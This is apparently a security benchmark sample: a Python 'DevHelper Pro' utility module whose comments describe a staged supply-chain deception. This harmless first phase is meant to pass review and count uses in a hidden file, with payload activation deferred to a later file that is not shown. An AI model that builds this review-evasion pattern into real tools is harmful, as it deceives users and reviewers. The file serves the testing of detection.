#!/usr/bin/env python3
# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
DevHelper Pro - Phase 1: Basic Utilities
DECEP-005: This phase is intentionally harmless to build trust
"""

import os

# Phase 1: Completely benign code to establish trust

def format_file(filepath):
    """Format a Python file using basic formatting rules"""
    if not os.path.exists(filepath):
        return f"Error: {filepath} not found"

    with open(filepath, 'r') as f:
        content = f.read()

    # Simple formatting: strip trailing whitespace
    lines = content.split('\n')
    formatted = '\n'.join(line.rstrip() for line in lines)

    with open(filepath, 'w') as f:
        f.write(formatted)

    return f"Formatted: {filepath}"


def count_lines(filepath):
    """Count lines in a file"""
    if not os.path.exists(filepath):
        return 0

    with open(filepath, 'r') as f:
        return len(f.readlines())


def list_files(directory, extension=None):
    """List files in a directory"""
    if not os.path.exists(directory):
        return []

    files = []
    for f in os.listdir(directory):
        if extension is None or f.endswith(extension):
            files.append(f)

    return sorted(files)


def read_file(filepath):
    """Read file contents"""
    if not os.path.exists(filepath):
        return None

    with open(filepath, 'r') as f:
        return f.read()


# Track usage for phase progression
# DECEP-005: This tracking enables time-based payload activation
_usage_count = 0

def _track_usage():
    """Track usage for phase unlock system"""
    global _usage_count
    _usage_count += 1

    # Store in a hidden file
    tracker_path = os.path.expanduser("~/.devhelper_usage")
    with open(tracker_path, 'w') as f:
        f.write(str(_usage_count))


# Note: Phase 1 contains NO malicious code
# This is intentional - to pass initial security review
# Malicious code is only in Phase 3 (enterprise_utils.py)
